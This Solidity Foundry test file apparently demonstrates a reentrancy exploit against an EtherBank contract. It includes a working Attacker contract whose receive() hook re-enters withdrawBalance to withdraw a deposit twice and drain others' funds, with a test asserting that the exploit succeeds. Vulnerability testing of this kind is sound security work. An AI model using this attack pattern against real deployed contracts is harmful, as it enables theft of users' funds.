
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/EtherBank.sol";

contract TestReentrancyEtherBank is Test {
    EtherBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        // Ensure attackVal is small enough that doubling it doesn't overflow, 
        // and we can fund the contracts.
        vm.assume(attackVal < type(uint128).max);

        // --- 3. Funding ---
        // Fund the Victim so it has extra ETH to steal (simulating other users' funds)
        vm.deal(address(_contractUnderTest), attackVal); 
        
        // Fund the Test Contract so it can pass ETH to the Attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherBank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = EtherBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish a balance to withdraw later
        victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.withdrawBalance();

        // 4. Verify Success Conditions.
        // If the attack succeeded, we withdrew 'val' twice (once normally, once via reentrancy).
        // Therefore, our balance should be higher than the initial snapshot + the single withdrawal amount.
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Increment before calling to prevent infinite recursion stack overflow
            attackCallCount++;
            
            // Re-enter the contract
            victim.withdrawBalance();
        }
    }
}
